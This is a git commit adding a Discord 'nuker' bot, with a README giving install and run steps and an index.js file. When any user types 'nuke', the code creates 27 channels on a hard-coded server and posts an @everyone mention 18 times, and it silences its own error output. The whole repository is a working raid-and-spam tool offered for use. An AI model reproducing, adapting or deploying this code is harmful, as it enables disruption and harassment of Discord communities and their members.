4b4208cfc941ffedd7cd3c3a9d4b3fd9547ec42e
sefty <68341055+krulsefty@users.noreply.github.com>
2023-01-23 20:29:43 +0100

    xd

--- README.md
+++ README.md
@@ -1,1 +1,9 @@
-# discord-nukker
+# discord-nukker bot
+mit license^
+
+at the begining you have to install NODE.JS
+after downloading bots files open cmd in your folder, type "npm install discord.js@12.5.0"
+make sure to change to token of your bot in config.js, channel name and message in index.js to everything works!
+after that steps open cmd in bots folder and type "node ."
+
+dm sefty#0001 for help
---
+++ index.js
@@ -0,0 +1,181 @@
+// sefty#001
+// MAKE SURE TO CHANGE "CHANNEL_NAME" AND "YOUR MESSAGE"
+
+const Discord = require("discord.js")
+
+const { TOKEN } = require("./config.js")
+
+const client = new Discord.Client()
+
+client.on("ready", () => {
+    console.log("Bot is online")
+})
+
+client.on("message", async message => {
+    const msg = message.content.toLowerCase()
+    const args = message.content.trim().split(/ +/g);
+    const guild = client.guilds.cache.get("1028708917196370042");
+
+    if (msg == "nuke") {
+        
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await guild.channels
+            .create("CHANNEL_NAME", {
+                type: "text",
+            })
+
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+        await message.channel.send(`@everyone YOUR MESSAGE`)
+    }
+})
+
+client.login(TOKEN)
+
+client.on("debug", () => { })
+client.on("warn", () => { })
+client.on("error", () => { })
